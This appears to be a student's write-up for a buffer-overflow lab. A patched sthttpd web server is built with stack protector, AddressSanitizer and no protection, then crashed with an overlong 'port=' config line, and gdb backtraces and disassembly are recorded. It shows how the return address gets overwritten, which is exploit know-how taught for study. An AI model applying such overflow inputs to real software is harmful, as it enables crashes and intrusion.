@@ -1,0 +1,843 @@
+Tanya Al-Rehani
+604593556
+
+1. I tested using echo $PATH and which gcc that /usr/local/cs/bin was in my PATH and that /usr/local/cs/bin/gcc was the default being used.
+
+2. I copied the link address for the sthttpd 2.27.0 download and used wget to install the tarred gzip file on the linux server. Then, I used tar -xzvf to unzip it into a directory, cd'd into that
+directory, and opened the src/thttpd.c file to make the two changes shown in the patch on the lab page. I then ran the provided configure command, along with the make clean and make CFLAGS commands
+appropriate to each version to create 3 different executable files. (-g3 -O2 -fno-inline -fstack-protector-strong for SP, -g3 -m32 -O2 -fno-inline -fsanitize=address for AS, and -g3 -O2 -fno-inline
+-fno-stack-protector -zexecstack for NO). Use mv src/thttpd src/thttpd-(sp,as,no) to move the executable each time to a new saved directory.  **TIP: Include -static-libasan after -g3 and before -O2 on
+the AS version to avoid library linker errors**
+
+3. My ID number is 604593556, so to calculate the port numbers...
+	SP = 12538
+	AS = 12539
+	NO = 12540
+   Then I used the given src/thttpd-(sp,as,no) -p <port number> -D to run the daemons. However, to run it on gdb, I had to do this:
+	gdb src/thttpd-sp
+	(gdb) r -p 12538 -D
+This runs the daemon in the foreground in gdb, and we can duplicate this result for each of the 3 compiled version by simply changing out thttpd-sp for -as and -no, and incrementing the port number in
+the above commands.
+
+4. Now, we want to verify that these actually work. With gdb running on thttpd-sp as explained above, open a new terminal and create a foo.txt file with some arbitrary data inside of it. My example
+contained the set of characters 'abc'.  Make sure the foo.txt file is inside the sthttpd-2.27.0 folder (the working directory of thttpd), then run curl http://localhost:12538/foo.txt This command
+should output the contents of foo.txt to the screen, and will confirm that thttpd-sp works in the normal case. Repeat step 4 for thttpd-sp, thttpd-as and thttpd-no with their respective port numbers.
+You should get foo.txt as output every time.
+
+   NOTE: The AS version produces the below error because there is a new update to -fsanitize that was unaccounted for, causing it to crash even when given the normal foo.txt file as input.
+
+=================================================================
+
+==33901==ERROR: AddressSanitizer: strcpy-param-overlap: memory ranges [0x0000013b9bc0,0x0000013b9bca) and [0x0000013b9bc7, 0x0000013b9bd1) overlap
+
+    #0 0x4781de in __interceptor_strcpy ../../../../gcc-6.2.0/libsanitizer/asan/asan_interceptors.cc:543
+
+    #1 0x4ec34e in httpd_ntoa /u/ee/ugrad/alrehani/CS33/Smashing_Lab/sthttpd-2.27.0/src/libhttpd.c:4081
+
+    #2 0x4ef632 in make_log_entry /u/ee/ugrad/alrehani/CS33/Smashing_Lab/sthttpd-2.27.0/src/libhttpd.c:3952
+
+    #3 0x4ef802 in httpd_close_conn /u/ee/ugrad/alrehani/CS33/Smashing_Lab/sthttpd-2.27.0/src/libhttpd.c:2449
+
+    #4 0x4e3195 in really_clear_connection /u/ee/ugrad/alrehani/CS33/Smashing_Lab/sthttpd-2.27.0/src/thttpd.c:2052
+
+    #5 0x4e4924 in handle_send /u/ee/ugrad/alrehani/CS33/Smashing_Lab/sthttpd-2.27.0/src/thttpd.c:1825
+
+    #6 0x408fe7 in main /u/ee/ugrad/alrehani/CS33/Smashing_Lab/sthttpd-2.27.0/src/thttpd.c:807
+
+    #7 0x7f361b77fb14 in __libc_start_main (/lib64/libc.so.6+0x21b14)
+
+    #8 0x40974c  (/w/home.09/ee/ugrad/alrehani/CS33/Smashing_Lab/sthttpd-2.27.0/src/thttpd-as+0x40974c)
+
+
+
+0x0000013b9bc0 is located 0 bytes inside of global variable 'str' defined in 'libhttpd.c:4072:17' (0x13b9bc0) of size 200
+
+0x0000013b9bc7 is located 7 bytes inside of global variable 'str' defined in 'libhttpd.c:4072:17' (0x13b9bc0) of size 200
+
+SUMMARY: AddressSanitizer: strcpy-param-overlap ../../../../gcc-6.2.0/libsanitizer/asan/asan_interceptors.cc:543 in __interceptor_strcpy
+
+==33901==ABORTING
+
+   **END NOTE**
+
+My exploit code crash_test.txt for #5,6,7 contains the following:
+port=000...000 (with a total of 982 zeros)
+
+5. 
+   Results:
+	(gdb) set disassemble-next-line on
+	(gdb) r -p 12538 -D -C crash_test.txt 
+	Starting program: /w/home.09/ee/ugrad/alrehani/CS33/Smashing_Lab/sthttpd-2.27.0/src/thttpd-sp -p 12538 -D -C crash_test.txt
+	[Thread debugging using libthread_db enabled]
+	Using host libthread_db library "/lib64/libthread_db.so.1".
+	*** stack smashing detected ***: /w/home.09/ee/ugrad/alrehani/CS33/Smashing_Lab/sthttpd-2.27.0/src/thttpd-sp terminated
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x00007ffff6db0118 in ?? () from /lib64/libgcc_s.so.1
+     => 0x00007ffff6db0118:	80 39 48	cmpb   $0x48,(%rcx)
+	
+   Backtrace: 
+	#0  0x00007ffff6db0118 in ?? () from /lib64/libgcc_s.so.1
+	#1  0x00007ffff6db1019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+	#2  0x00007ffff76e4be6 in backtrace () from /lib64/libc.so.6
+	#3  0x00007ffff764f344 in __libc_message () from /lib64/libc.so.6
+	#4  0x00007ffff76e8597 in __fortify_fail () from /lib64/libc.so.6
+	#5  0x00007ffff76e8560 in __stack_chk_fail () from /lib64/libc.so.6
+	#6  0x0000000000405056 in read_config (filename=<optimized out>) at thttpd.c:1190
+	#7  0x3030303030303030 in ?? ()
+	#8  0x3030303030303030 in ?? ()
+	#9  0x3030303030303030 in ?? ()
+	#10 0x3030303030303030 in ?? ()
+	#11 0x3030303030303030 in ?? ()
+	#12 0x3030303030303030 in ?? ()
+	#13 0x0000000000000030 in ?? ()
+	#14 0x0000000000000000 in ?? ()
+
+   Machine Instruction that failed: cmpb   $0x48,(%rcx)
+   Source Code Line:
+	(void) fclose( fp );
+	}
+   Line 1190 (given to use by the above backtrace, reveals the error to be on the ending bracket of the function, just after (void) fclose(fp); finishes. We break on the return of this function
+because it is at the end of the function that -fstack-protector-strong kicks in to check the canary values and determine if there has been buffer overflow. The compare instruction above is comparing
+the canary to the value at that address currently and that is where we realize the value has changed and break to see the return values have been overwritten with all 0s.
+   
+6. 
+   Results:
+	(gdb) r -p 12539 -D -C crash_test.txt 
+	Starting program: /w/home.09/ee/ugrad/alrehani/CS33/Smashing_Lab/sthttpd-2.27.0/src/thttpd-as -p 12539 -D -C crash_test.txt
+	[Thread debugging using libthread_db enabled]
+	Using host libthread_db library "/lib64/libthread_db.so.1".
+	=================================================================
+	==35542==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcd64 at pc 0x00000043b2e9 bp 0x7fffffffccc0 sp 0x7fffffffc470
+	READ of size 988 at 0x7fffffffcd64 thread T0
+	
+	Program received signal SIGSEGV, Segmentation fault.
+	0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
+     => 0x00007ffff7073118:	80 39 48	cmpb   $0x48,(%rcx)
+
+   Machine Instruction that failed: cmpb   $0x48,(%rcx)
+   We break on the same instruction/line as we did in #5, for the same reasons. The end of the function call is where the shadow bytes are checked, and the code breaks once it realizes that these
+values have changed. 
+
+7. 
+   Results:
+	(gdb) r -p 12540 -D -C crash_test.txt 
+	Starting program: /w/home.09/ee/ugrad/alrehani/CS33/Smashing_Lab/sthttpd-2.27.0/src/thttpd-no -p 12540 -D -C crash_test.txt
+	[Thread debugging using libthread_db enabled]
+	Using host libthread_db library "/lib64/libthread_db.so.1".
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+	1190	    }
+	   0x0000000000404d93 <read_config+1203>:	48 83 c4 70	add    $0x70,%rsp
+	   0x0000000000404d97 <read_config+1207>:	5b	pop    %rbx
+	   0x0000000000404d98 <read_config+1208>:	5d	pop    %rbp
+	   0x0000000000404d99 <read_config+1209>:	41 5c	pop    %r12
+	   0x0000000000404d9b <read_config+1211>:	41 5d	pop    %r13
+	   0x0000000000404d9d <read_config+1213>:	41 5e	pop    %r14
+	=> 0x0000000000404d9f <read_config+1215>:	c3	retq   
+	
+   Backtrace:
+#0  0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+#1  0x3030303030303030 in ?? ()
+#2  0x3030303030303030 in ?? ()
+#3  0x3030303030303030 in ?? ()
+#4  0x3030303030303030 in ?? ()
+#5  0x3030303030303030 in ?? ()
+#6  0x3030303030303030 in ?? ()
+#7  0x3030303030303030 in ?? ()
+#8  0x3030303030303030 in ?? ()
+#9  0x3030303030303030 in ?? ()
+#10 0x3030303030303030 in ?? ()
+#11 0x3030303030303030 in ?? ()
+#12 0x3030303030303030 in ?? ()
+#13 0x3030303030303030 in ?? ()
+#14 0x3030303030303030 in ?? ()
+#15 0x3030303030303030 in ?? ()
+#16 0x3030303030303030 in ?? ()
+#17 0x3030303030303030 in ?? ()
+#18 0x3030303030303030 in ?? ()
+#19 0x3030303030303030 in ?? ()
+#20 0x3030303030303030 in ?? ()
+#21 0x3030303030303030 in ?? ()
+#22 0x3030303030303030 in ?? ()
+#23 0x3030303030303030 in ?? ()
+#24 0x3030303030303030 in ?? ()
+#25 0x3030303030303030 in ?? ()
+#26 0x3030303030303030 in ?? ()
+#27 0x3030303030303030 in ?? ()
+#28 0x3030303030303030 in ?? ()
+#29 0x3030303030303030 in ?? ()
+#30 0x3030303030303030 in ?? ()
+#31 0x3030303030303030 in ?? ()
+#32 0x3030303030303030 in ?? ()
+#33 0x3030303030303030 in ?? ()
+#34 0x3030303030303030 in ?? ()
+#35 0x3030303030303030 in ?? ()
+#36 0x3030303030303030 in ?? ()
+#37 0x3030303030303030 in ?? ()
+#38 0x3030303030303030 in ?? ()
+#39 0x3030303030303030 in ?? ()
+#40 0x3030303030303030 in ?? ()
+#41 0x3030303030303030 in ?? ()
+#42 0x3030303030303030 in ?? ()
+#43 0x3030303030303030 in ?? ()
+#44 0x3030303030303030 in ?? ()
+#45 0x3030303030303030 in ?? ()
+#46 0x3030303030303030 in ?? ()
+#47 0x3030303030303030 in ?? ()
+#48 0x3030303030303030 in ?? ()
+#49 0x3030303030303030 in ?? ()
+#50 0x3030303030303030 in ?? ()
+#51 0x3030303030303030 in ?? ()
+#52 0x3030303030303030 in ?? ()
+#53 0x3030303030303030 in ?? ()
+#54 0x3030303030303030 in ?? ()
+#55 0x3030303030303030 in ?? ()
+#56 0x3030303030303030 in ?? ()
+#57 0x3030303030303030 in ?? ()
+#58 0x3030303030303030 in ?? ()
+#59 0x3030303030303030 in ?? ()
+#60 0x3030303030303030 in ?? ()
+#61 0x3030303030303030 in ?? ()
+#62 0x3030303030303030 in ?? ()
+#63 0x3030303030303030 in ?? ()
+#64 0x3030303030303030 in ?? ()
+#65 0x3030303030303030 in ?? ()
+#66 0x3030303030303030 in ?? ()
+#67 0x3030303030303030 in ?? ()
+#68 0x3030303030303030 in ?? ()
+#69 0x3030303030303030 in ?? ()
+#70 0x3030303030303030 in ?? ()
+#71 0x3030303030303030 in ?? ()
+#72 0x3030303030303030 in ?? ()
+#73 0x3030303030303030 in ?? ()
+#74 0x3030303030303030 in ?? ()
+#75 0x3030303030303030 in ?? ()
+#76 0x3030303030303030 in ?? ()
+#77 0x3030303030303030 in ?? ()
+#78 0x3030303030303030 in ?? ()
+#79 0x3030303030303030 in ?? ()
+#80 0x3030303030303030 in ?? ()
+#81 0x3030303030303030 in ?? ()
+#82 0x3030303030303030 in ?? ()
+#83 0x3030303030303030 in ?? ()
+#84 0x3030303030303030 in ?? ()
+#85 0x3030303030303030 in ?? ()
+#86 0x3030303030303030 in ?? ()
+#87 0x3030303030303030 in ?? ()
+#88 0x3030303030303030 in ?? ()
+#89 0x3030303030303030 in ?? ()
+#90 0x3030303030303030 in ?? ()
+#91 0x3030303030303030 in ?? ()
+#92 0x3030303030303030 in ?? ()
+#93 0x3030303030303030 in ?? ()
+#94 0x3030303030303030 in ?? ()
+#95 0x3030303030303030 in ?? ()
+#96 0x3030303030303030 in ?? ()
+#97 0x3030303030303030 in ?? ()
+#98 0x3030303030303030 in ?? ()
+#99 0x3030303030303030 in ?? ()
+#100 0x3030303030303030 in ?? ()
+#101 0x3030303030303030 in ?? ()
+#102 0x3030303030303030 in ?? ()
+#103 0x3030303030303030 in ?? ()
+#104 0x3030303030303030 in ?? ()
+#105 0x0000000000003030 in ?? ()
+#106 0x0000000000000000 in ?? ()
+
+   Disassemble:
+	Dump of assembler code for function read_config:
+   0x00000000004048e0 <+0>:	push   %r14
+   0x00000000004048e2 <+2>:	push   %r13
+   0x00000000004048e4 <+4>:	mov    $0x40ec8d,%esi
+   0x00000000004048e9 <+9>:	push   %r12
+   0x00000000004048eb <+11>:	push   %rbp
+   0x00000000004048ec <+12>:	push   %rbx
+   0x00000000004048ed <+13>:	mov    %rdi,%rbx
+   0x00000000004048f0 <+16>:	sub    $0x70,%rsp
+   0x00000000004048f4 <+20>:	callq  0x402830 <fopen@plt>
+   0x00000000004048f9 <+25>:	test   %rax,%rax
+   0x00000000004048fc <+28>:	je     0x404e7c <read_config+1436>
+   0x0000000000404902 <+34>:	mov    %rax,%r12
+   0x0000000000404905 <+37>:	movabs $0x100002600,%r14
+   0x000000000040490f <+47>:	mov    %r12,%rdx
+   0x0000000000404912 <+50>:	mov    $0x3e8,%esi
+   0x0000000000404917 <+55>:	mov    %rsp,%rdi
+   0x000000000040491a <+58>:	callq  0x4025a0 <fgets@plt>
+   0x000000000040491f <+63>:	test   %rax,%rax
+   0x0000000000404922 <+66>:	je     0x404d8b <read_config+1195>
+   0x0000000000404928 <+72>:	mov    $0x23,%esi
+   0x000000000040492d <+77>:	mov    %rsp,%rdi
+   0x0000000000404930 <+80>:	callq  0x402480 <strchr@plt>
+   0x0000000000404935 <+85>:	test   %rax,%rax
+   0x0000000000404938 <+88>:	je     0x40493d <read_config+93>
+   0x000000000040493a <+90>:	movb   $0x0,(%rax)
+   0x000000000040493d <+93>:	mov    $0x40ebab,%esi
+   0x0000000000404942 <+98>:	mov    %rsp,%rdi
+   0x0000000000404945 <+101>:	callq  0x402550 <strspn@plt>
+   0x000000000040494a <+106>:	lea    (%rsp,%rax,1),%rbp
+   0x000000000040494e <+110>:	cmpb   $0x0,0x0(%rbp)
+   0x0000000000404952 <+114>:	jne    0x404beb <read_config+779>
+   0x0000000000404958 <+120>:	jmp    0x40490f <read_config+47>
+   0x000000000040495a <+122>:	nopw   0x0(%rax,%rax,1)
+   0x0000000000404960 <+128>:	mov    $0x3d,%esi
+   0x0000000000404965 <+133>:	mov    %rbp,%rdi
+   0x0000000000404968 <+136>:	callq  0x402480 <strchr@plt>
+   0x000000000040496d <+141>:	test   %rax,%rax
+   0x0000000000404970 <+144>:	je     0x404c6d <read_config+909>
+   0x0000000000404976 <+150>:	lea    0x1(%rax),%r13
+   0x000000000040497a <+154>:	movb   $0x0,(%rax)
+   0x000000000040497d <+157>:	mov    $0x40ebb0,%esi
+   0x0000000000404982 <+162>:	mov    %rbp,%rdi
+   0x0000000000404985 <+165>:	callq  0x4022b0 <strcasecmp@plt>
+   0x000000000040498a <+170>:	test   %eax,%eax
+   0x000000000040498c <+172>:	je     0x404c37 <read_config+855>
+   0x0000000000404992 <+178>:	mov    $0x40ebb6,%esi
+   0x0000000000404997 <+183>:	mov    %rbp,%rdi
+   0x000000000040499a <+186>:	callq  0x4022b0 <strcasecmp@plt>
+   0x000000000040499f <+191>:	test   %eax,%eax
+   0x00000000004049a1 <+193>:	je     0x404c4e <read_config+878>
+   0x00000000004049a7 <+199>:	mov    $0x40ebc9,%esi
+   0x00000000004049ac <+204>:	mov    %rbp,%rdi
+   0x00000000004049af <+207>:	callq  0x4022b0 <strcasecmp@plt>
+   0x00000000004049b4 <+212>:	test   %eax,%eax
+   0x00000000004049b6 <+214>:	je     0x404c75 <read_config+917>
+   0x00000000004049bc <+220>:	mov    $0x40ebbd,%esi
+   0x00000000004049c1 <+225>:	mov    %rbp,%rdi
+   0x00000000004049c4 <+228>:	callq  0x4022b0 <strcasecmp@plt>
+   0x00000000004049c9 <+233>:	test   %eax,%eax
+   0x00000000004049cb <+235>:	je     0x404c94 <read_config+948>
+   0x00000000004049d1 <+241>:	mov    $0x40ebbb,%esi
+   0x00000000004049d6 <+246>:	mov    %rbp,%rdi
+   0x00000000004049d9 <+249>:	callq  0x4022b0 <strcasecmp@plt>
+   0x00000000004049de <+254>:	test   %eax,%eax
+   0x00000000004049e0 <+256>:	je     0x404cb8 <read_config+984>
+   0x00000000004049e6 <+262>:	mov    $0x40ebc4,%esi
+   0x00000000004049eb <+267>:	mov    %rbp,%rdi
+   0x00000000004049ee <+270>:	callq  0x4022b0 <strcasecmp@plt>
+   0x00000000004049f3 <+275>:	test   %eax,%eax
+   0x00000000004049f5 <+277>:	je     0x404cf6 <read_config+1046>
+   0x00000000004049fb <+283>:	mov    $0x40ebcf,%esi
+   0x0000000000404a00 <+288>:	mov    %rbp,%rdi
+   0x0000000000404a03 <+291>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404a08 <+296>:	test   %eax,%eax
+   0x0000000000404a0a <+298>:	je     0x404cdc <read_config+1020>
+   0x0000000000404a10 <+304>:	mov    $0x40ebcd,%esi
+   0x0000000000404a15 <+309>:	mov    %rbp,%rdi
+   0x0000000000404a18 <+312>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404a1d <+317>:	test   %eax,%eax
+   0x0000000000404a1f <+319>:	je     0x404d15 <read_config+1077>
+   0x0000000000404a25 <+325>:	mov    $0x40ebd9,%esi
+   0x0000000000404a2a <+330>:	mov    %rbp,%rdi
+   0x0000000000404a2d <+333>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404a32 <+338>:	test   %eax,%eax
+   0x0000000000404a34 <+340>:	je     0x404cdc <read_config+1020>
+   0x0000000000404a3a <+346>:	mov    $0x40ebd7,%esi
+   0x0000000000404a3f <+351>:	mov    %rbp,%rdi
+   0x0000000000404a42 <+354>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404a47 <+359>:	test   %eax,%eax
+   0x0000000000404a49 <+361>:	je     0x404d15 <read_config+1077>
+   0x0000000000404a4f <+367>:	mov    $0x40ebe2,%esi
+   0x0000000000404a54 <+372>:	mov    %rbp,%rdi
+   0x0000000000404a57 <+375>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404a5c <+380>:	test   %eax,%eax
+   0x0000000000404a5e <+382>:	je     0x404d2f <read_config+1103>
+   0x0000000000404a64 <+388>:	mov    $0x40ebe7,%esi
+   0x0000000000404a69 <+393>:	mov    %rbp,%rdi
+   0x0000000000404a6c <+396>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404a71 <+401>:	test   %eax,%eax
+   0x0000000000404a73 <+403>:	je     0x404d6c <read_config+1164>
+   0x0000000000404a79 <+409>:	mov    $0x40ebee,%esi
+   0x0000000000404a7e <+414>:	mov    %rbp,%rdi
+   0x0000000000404a81 <+417>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404a86 <+422>:	test   %eax,%eax
+   0x0000000000404a88 <+424>:	je     0x404d4e <read_config+1134>
+   0x0000000000404a8e <+430>:	mov    $0x40ebf7,%esi
+   0x0000000000404a93 <+435>:	mov    %rbp,%rdi
+   0x0000000000404a96 <+438>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404a9b <+443>:	test   %eax,%eax
+   0x0000000000404a9d <+445>:	je     0x404dba <read_config+1242>
+   0x0000000000404aa3 <+451>:	mov    $0x40ebfe,%esi
+   0x0000000000404aa8 <+456>:	mov    %rbp,%rdi
+   0x0000000000404aab <+459>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404ab0 <+464>:	test   %eax,%eax
+   0x0000000000404ab2 <+466>:	je     0x404da0 <read_config+1216>
+   0x0000000000404ab8 <+472>:	mov    $0x40ec0e,%esi
+   0x0000000000404abd <+477>:	mov    %rbp,%rdi
+   0x0000000000404ac0 <+480>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404ac5 <+485>:	test   %eax,%eax
+   0x0000000000404ac7 <+487>:	je     0x404dd9 <read_config+1273>
+   0x0000000000404acd <+493>:	mov    $0x40ec17,%esi
+   0x0000000000404ad2 <+498>:	mov    %rbp,%rdi
+   0x0000000000404ad5 <+501>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404ada <+506>:	test   %eax,%eax
+   0x0000000000404adc <+508>:	je     0x404e8e <read_config+1454>
+   0x0000000000404ae2 <+514>:	mov    $0x40f0f7,%esi
+   0x0000000000404ae7 <+519>:	mov    %rbp,%rdi
+   0x0000000000404aea <+522>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404aef <+527>:	test   %eax,%eax
+   0x0000000000404af1 <+529>:	je     0x404ecc <read_config+1516>
+   0x0000000000404af7 <+535>:	mov    $0x40ed00,%esi
+   0x0000000000404afc <+540>:	mov    %rbp,%rdi
+   0x0000000000404aff <+543>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404b04 <+548>:	test   %eax,%eax
+   0x0000000000404b06 <+550>:	je     0x404ead <read_config+1485>
+   0x0000000000404b0c <+556>:	mov    $0x40ec23,%esi
+   0x0000000000404b11 <+561>:	mov    %rbp,%rdi
+   0x0000000000404b14 <+564>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404b19 <+569>:	test   %eax,%eax
+   0x0000000000404b1b <+571>:	je     0x404f39 <read_config+1625>
+   0x0000000000404b21 <+577>:	mov    $0x40ec21,%esi
+   0x0000000000404b26 <+582>:	mov    %rbp,%rdi
+   0x0000000000404b29 <+585>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404b2e <+590>:	test   %eax,%eax
+   0x0000000000404b30 <+592>:	je     0x404f1f <read_config+1599>
+   0x0000000000404b36 <+598>:	mov    $0x40ec2b,%esi
+   0x0000000000404b3b <+603>:	mov    %rbp,%rdi
+   0x0000000000404b3e <+606>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404b43 <+611>:	test   %eax,%eax
+   0x0000000000404b45 <+613>:	je     0x404f05 <read_config+1573>
+   0x0000000000404b4b <+619>:	mov    $0x40ec29,%esi
+   0x0000000000404b50 <+624>:	mov    %rbp,%rdi
+   0x0000000000404b53 <+627>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404b58 <+632>:	test   %eax,%eax
+   0x0000000000404b5a <+634>:	je     0x404eeb <read_config+1547>
+   0x0000000000404b60 <+640>:	mov    $0x40ec38,%esi
+   0x0000000000404b65 <+645>:	mov    %rbp,%rdi
+   0x0000000000404b68 <+648>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404b6d <+653>:	test   %eax,%eax
+   0x0000000000404b6f <+655>:	je     0x404e5d <read_config+1405>
+   0x0000000000404b75 <+661>:	mov    $0x40ec40,%esi
+   0x0000000000404b7a <+666>:	mov    %rbp,%rdi
+   0x0000000000404b7d <+669>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404b82 <+674>:	test   %eax,%eax
+   0x0000000000404b84 <+676>:	je     0x404e3e <read_config+1374>
+   0x0000000000404b8a <+682>:	mov    $0x40ec48,%esi
+   0x0000000000404b8f <+687>:	mov    %rbp,%rdi
+   0x0000000000404b92 <+690>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404b97 <+695>:	test   %eax,%eax
+   0x0000000000404b99 <+697>:	je     0x404e1f <read_config+1343>
+   0x0000000000404b9f <+703>:	mov    $0x40ec4c,%esi
+   0x0000000000404ba4 <+708>:	mov    %rbp,%rdi
+   0x0000000000404ba7 <+711>:	callq  0x4022b0 <strcasecmp@plt>
+   0x0000000000404bac <+716>:	test   %eax,%eax
+   0x0000000000404bae <+718>:	jne    0x404df8 <read_config+1304>
+   0x0000000000404bb4 <+724>:	mov    %r13,%rsi
+   0x0000000000404bb7 <+727>:	mov    %rbp,%rdi
+   0x0000000000404bba <+730>:	callq  0x404670 <value_required>
+   0x0000000000404bbf <+735>:	mov    %r13,%rdi
+   0x0000000000404bc2 <+738>:	callq  0x402880 <atoi@plt>
+   0x0000000000404bc7 <+743>:	mov    %eax,0x211393(%rip)        # 0x615f60 <max_age>
+   0x0000000000404bcd <+749>:	nopl   (%rax)
+   0x0000000000404bd0 <+752>:	mov    $0x40ebab,%esi
+   0x0000000000404bd5 <+757>:	mov    %rbx,%rdi
+   0x0000000000404bd8 <+760>:	callq  0x402550 <strspn@plt>
+   0x0000000000404bdd <+765>:	lea    (%rbx,%rax,1),%rbp
+   0x0000000000404be1 <+769>:	cmpb   $0x0,0x0(%rbp)
+   0x0000000000404be5 <+773>:	je     0x40490f <read_config+47>
+   0x0000000000404beb <+779>:	mov    $0x40ebab,%esi
+   0x0000000000404bf0 <+784>:	mov    %rbp,%rdi
+   0x0000000000404bf3 <+787>:	callq  0x402570 <strcspn@plt>
+   0x0000000000404bf8 <+792>:	lea    0x0(%rbp,%rax,1),%rbx
+   0x0000000000404bfd <+797>:	movzbl (%rbx),%eax
+   0x0000000000404c00 <+800>:	cmp    $0x20,%al
+   0x0000000000404c02 <+802>:	ja     0x404960 <read_config+128>
+   0x0000000000404c08 <+808>:	bt     %rax,%r14
+   0x0000000000404c0c <+812>:	jae    0x404960 <read_config+128>
+   0x0000000000404c12 <+818>:	nopw   0x0(%rax,%rax,1)
+   0x0000000000404c18 <+824>:	add    $0x1,%rbx
+   0x0000000000404c1c <+828>:	movzbl (%rbx),%edx
+   0x0000000000404c1f <+831>:	movb   $0x0,-0x1(%rbx)
+   0x0000000000404c23 <+835>:	cmp    $0x20,%dl
+   0x0000000000404c26 <+838>:	ja     0x404960 <read_config+128>
+   0x0000000000404c2c <+844>:	bt     %rdx,%r14
+   0x0000000000404c30 <+848>:	jb     0x404c18 <read_config+824>
+   0x0000000000404c32 <+850>:	jmpq   0x404960 <read_config+128>
+   0x0000000000404c37 <+855>:	mov    %r13,%rsi
+   0x0000000000404c3a <+858>:	mov    %rbp,%rdi
+   0x0000000000404c3d <+861>:	callq  0x404630 <no_value_required>
+   0x0000000000404c42 <+866>:	movl   $0x1,0x2113a8(%rip)        # 0x615ff4 <debug>
+   0x0000000000404c4c <+876>:	jmp    0x404bd0 <read_config+752>
+   0x0000000000404c4e <+878>:	mov    %r13,%rsi
+   0x0000000000404c51 <+881>:	mov    %rbp,%rdi
+   0x0000000000404c54 <+884>:	callq  0x404670 <value_required>
+   0x0000000000404c59 <+889>:	mov    %r13,%rdi
+   0x0000000000404c5c <+892>:	callq  0x402880 <atoi@plt>
+   0x0000000000404c61 <+897>:	mov    %ax,0x211388(%rip)        # 0x615ff0 <port>
+   0x0000000000404c68 <+904>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404c6d <+909>:	xor    %r13d,%r13d
+   0x0000000000404c70 <+912>:	jmpq   0x40497d <read_config+157>
+   0x0000000000404c75 <+917>:	mov    %r13,%rsi
+   0x0000000000404c78 <+920>:	mov    %rbp,%rdi
+   0x0000000000404c7b <+923>:	callq  0x404670 <value_required>
+   0x0000000000404c80 <+928>:	mov    %r13,%rdi
+   0x0000000000404c83 <+931>:	callq  0x404890 <e_strdup>
+   0x0000000000404c88 <+936>:	mov    %rax,0x211359(%rip)        # 0x615fe8 <dir>
+   0x0000000000404c8f <+943>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404c94 <+948>:	mov    %r13,%rsi
+   0x0000000000404c97 <+951>:	mov    %rbp,%rdi
+   0x0000000000404c9a <+954>:	callq  0x404630 <no_value_required>
+   0x0000000000404c9f <+959>:	movl   $0x1,0x21132f(%rip)        # 0x615fd8 <do_chroot>
+   0x0000000000404ca9 <+969>:	movl   $0x1,0x21131d(%rip)        # 0x615fd0 <no_symlink_check>
+   0x0000000000404cb3 <+979>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404cb8 <+984>:	mov    %r13,%rsi
+   0x0000000000404cbb <+987>:	mov    %rbp,%rdi
+   0x0000000000404cbe <+990>:	callq  0x404630 <no_value_required>
+   0x0000000000404cc3 <+995>:	movl   $0x0,0x21130b(%rip)        # 0x615fd8 <do_chroot>
+   0x0000000000404ccd <+1005>:	movl   $0x0,0x2112f9(%rip)        # 0x615fd0 <no_symlink_check>
+   0x0000000000404cd7 <+1015>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404cdc <+1020>:	mov    %r13,%rsi
+   0x0000000000404cdf <+1023>:	mov    %rbp,%rdi
+   0x0000000000404ce2 <+1026>:	callq  0x404630 <no_value_required>
+   0x0000000000404ce7 <+1031>:	movl   $0x0,0x2112df(%rip)        # 0x615fd0 <no_symlink_check>
+   0x0000000000404cf1 <+1041>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404cf6 <+1046>:	mov    %r13,%rsi
+   0x0000000000404cf9 <+1049>:	mov    %rbp,%rdi
+   0x0000000000404cfc <+1052>:	callq  0x404670 <value_required>
+   0x0000000000404d01 <+1057>:	mov    %r13,%rdi
+   0x0000000000404d04 <+1060>:	callq  0x404890 <e_strdup>
+   0x0000000000404d09 <+1065>:	mov    %rax,0x2112d0(%rip)        # 0x615fe0 <data_dir>
+   0x0000000000404d10 <+1072>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404d15 <+1077>:	mov    %r13,%rsi
+   0x0000000000404d18 <+1080>:	mov    %rbp,%rdi
+   0x0000000000404d1b <+1083>:	callq  0x404630 <no_value_required>
+   0x0000000000404d20 <+1088>:	movl   $0x1,0x2112a6(%rip)        # 0x615fd0 <no_symlink_check>
+   0x0000000000404d2a <+1098>:	jmpq   0x404bd0 <read_config+752>
+   0x0000000000404d2f <+1103>:	mov    %r13,%rsi
+   0x0000000000404d32 <+1106>:	mov    %rbp,%rdi
+   0x0000000000404d35 <+1109>:	callq  0x404670 <value_required>
+   0x0000000000404d3a <+1114>:	mov    %r13,%rdi
+   0x0000000000404d3d <+1117>:	callq  0x404890 <e_strdup>
